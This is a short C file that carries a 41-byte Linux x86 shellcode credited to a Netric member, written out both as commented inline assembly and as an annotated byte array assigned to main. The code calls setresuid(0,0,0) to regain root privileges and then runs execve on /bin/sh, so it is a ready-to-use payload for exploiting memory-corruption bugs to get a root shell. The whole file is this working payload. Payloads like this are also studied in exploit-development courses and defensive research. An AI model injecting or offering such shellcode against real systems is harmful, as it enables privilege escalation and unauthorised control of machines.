/* linux x86 shellcode(41 bytes) by sacrine of Netric (www.netric.org)
 * setresuid(0,0,0); execve /bin/sh; exit;
 *

        __asm(" xorl %eax,%eax
                xorl %ebx,%ebx
                xorl %ecx,%ecx
                cdq
                movb $0xa4, %al
                int $0x80

                xorl %eax,%eax
                push %eax
                pushl   $0x68732f2f
                pushl   $0x6e69622f
                mov %esp, %ebx
                push %eax
                push %ebx
                lea (%esp,1),%ecx
                movb $0xb, %al
                int $0x80

                xorl %eax,%eax
                mov  $0x1, %al
                int $0x80
");

*/

char main[]=
        // setresuid(0,0,0);

        "\x31\xc0"              // xor  %eax,%eax
        "\x31\xdb"              // xor  %ebx,%ebx
        "\x31\xc9"              // xor  %ecx,%ecx
        "\x99"                  // cdq
        "\xb0\xa4"              // mov  $0xa4, %al
        "\xcd\x80"              // int  $0x80

        // execve /bin/sh

        "\x31\xc0"                      // xor    %eax,%eax
        "\x50"                          // push   %eax
        "\x68\x2f\x2f\x73\x68"          // push   $0x68732f2f
        "\x68\x2f\x62\x69\x6e"          // push   $0x6e69622f
        "\x89\xe3"                      // mov    %esp,%ebx
        "\x50"                          // push   %eax
        "\x53"                          // push   %ebx
        "\x8d\x0c\x24"                  // lea    (%esp,1),%ecx
        "\xb0\x0b"                      // mov    $0xb,%al
        "\xcd\x80"                      // int    $0x80

        // exit

        "\x31\xc0"              // xorl %eax,%eax
        "\xb0\x01"              // movb $0x1, %al
        "\xcd\x80";             // int  $0x80